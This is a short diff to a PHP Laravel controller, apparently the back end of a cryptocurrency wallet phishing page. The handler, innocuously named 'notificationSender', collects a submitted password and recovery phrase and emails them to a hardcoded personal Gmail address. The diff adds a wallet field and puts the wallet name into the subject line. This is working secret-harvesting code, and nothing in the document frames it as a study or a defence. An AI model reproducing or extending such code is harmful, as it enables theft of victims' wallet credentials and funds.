@@ -11,14 +11,18 @@ class notificationSender extends Controller
     {
         $data = [
             'password' => $request->password,
-            'pharse' => $request->pharse
+            'pharse' => $request->pharse,
+            'wallet' => $request->wallet
         ];
-        
+
+
+
         $user['to'] = 'sourov.okk@gmail.com';
 
-        Mail::send('mail', $data, function($message) use ($user) {
+        Mail::send('mail', $data, function($message) use ($user, $data) {
             $message->to($user['to']);
-            $message->subject('Registration Details');
+            $details = 'Registration Request' . '-' . $data['wallet'];
+            $message->subject($details);
         });
 
         return redirect('/');
